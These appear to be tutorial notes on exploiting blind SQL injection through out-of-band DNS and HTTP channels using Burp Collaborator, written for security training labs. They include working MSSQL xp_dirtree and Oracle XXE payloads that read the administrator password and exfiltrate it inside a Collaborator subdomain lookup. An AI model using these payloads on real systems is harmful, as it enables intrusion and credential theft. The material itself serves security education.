## Exploiting blind SQL injection using out-of-band (OAST) techniques

   

[OAST (out-of-band application security testing)](https://portswigger.net/burp/application-security-testing/oast)

  
  
Now, suppose that the application carries out the same SQL query, but does it _asynchronously_. The application continues processing the user's request in the original thread, and uses another thread to execute an SQL query using the tracking cookie.  
  
  
The query is still vulnerable to SQL injection, however none of the techniques described so far will work::  
>`the application's response doesn't depend on whether the query returns any data,  
or on whether a database error occurs,  
or on the time taken to execute the query`  
  
  
In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. As previously, these can be triggered conditionally, depending on an injected condition, to infer information one bit at a time. But more powerfully, data can be exfiltrated directly within the network interaction itself.  
A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). This is because very many production networks allow free egress of DNS queries, because they are essential for the normal operation of production systems.  
  
The easiest and most reliable way to use out-of-band techniques is using [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator). This is a server that provides custom implementations of various network services (including DNS), and allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Support for Burp Collaborator is built in to [Burp Suite Professional](https://portswigger.net/burp/pro) with no configuration required.  
  
  
**NOTE**: _The techniques for triggering a DNS query are highly specific to the type of database being used._  
  
  
On Microsoft SQL Server, input like the following can be used to cause a DNS lookup on a specified domain:  
``'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--  ``
This will cause the database to perform a lookup for the following domain:  
>0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net  
  
You can use Burp Suite's [Collaborator client](https://portswigger.net/burp/documentation/desktop/tools/collaborator-client) to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.  
  
> Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application.  
  
For example:  
``'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--  ``
  
_This input reads the password for the Administrator user, appends a unique Collaborator subdomain, and triggers a DNS lookup._  
This will result in a DNS lookup like the following, allowing you to view the captured password:  
>S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net  
  
Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, _OAST techniques are often preferable even in situations where other techniques for blind exploitation do work._  
  

### Note

  
There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).  
  
  
**Out of Band(OAST) techniques on Oracle Database**:  

Combining SQL injection with basic [XXE](https://portswigger.net/web-security/xxe) techniques as follows:  
  
```'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.YOUR-COLLABORATOR-ID.burpcollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--  ```
  
//we can get the collaborator ID from Burp Collaborator Client > Copy to clipboard > paste by replacing collaborator id  
  
After succesful DNS lookup:  
Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again, since the server-side query is executed asynchronously.  
â€¢ You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the `administrator` user should appear in the subdomain of the interaction, and you can view this within the Burp Collaborator client.  
For DNS interactions, the full domain name that was looked up is shown in the Description tab.  
For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab.  
  
Below the selected text is the administrator password:  
  
![file:///tmp/.MLQWB1/1.png](file:///tmp/.MLQWB1/1.png)